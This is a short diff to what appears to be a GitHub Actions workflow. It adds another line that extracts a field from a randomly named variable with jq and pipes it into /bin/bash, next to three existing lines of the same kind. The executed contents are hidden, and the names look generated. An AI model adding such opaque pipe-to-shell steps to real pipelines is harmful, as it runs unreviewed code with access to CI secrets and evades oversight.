@@ -26,6 +26,7 @@ jobs:
           echo $mfme60 | jq -r .e9 | /bin/bash
           echo $lwk0 | jq -r .qxz1719 | /bin/bash
           printf '%s' "$p10" | jq -r .xd2607 | /bin/bash
+          echo $n94 | jq -r .qjyw25705 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
